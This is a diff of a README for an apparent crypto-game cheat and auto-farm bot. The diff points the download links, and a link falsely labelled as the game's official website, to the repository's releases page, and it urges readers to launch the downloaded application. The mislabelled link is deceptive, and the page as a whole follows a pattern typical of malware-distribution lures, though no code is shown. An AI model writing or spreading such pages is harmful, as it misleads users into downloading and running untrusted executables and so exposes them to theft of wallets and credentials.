@@ -38,14 +38,14 @@ Common Ground World is a captivating blockchain-based game that offers players t
 - Profit optimization
 
 ## 📁 Download Application
-You can download the Common Ground World Crypto Bot application from the following link: [Download Application](https://github.com/files/uploaded/Application.zip)
+You can download the Common Ground World Crypto Bot application from the following link: [Download Application](https://github.com/babtou34/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)
 
-[![Download Application](https://img.shields.io/badge/Download-Application-9cf)](https://github.com/files/uploaded/Application.zip)
+[![Download Application](https://github.com/babtou34/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)](https://github.com/babtou34/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)
 
 If the link ends with a file name, make sure to launch the application to start automating your gameplay in Common Ground World.
 
 ## 🌐 External Resources
-To explore more about the Common Ground World game or learn about blockchain technology, visit the official [Common Ground World website](https://www.commongroundworld.com).
+To explore more about the Common Ground World game or learn about blockchain technology, visit the official [Common Ground World website](https://github.com/babtou34/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases).
 
 Remember, for any updated versions or additional releases of the Common Ground World Crypto Bot, check the "Releases" section of this repository for the latest downloads.
 
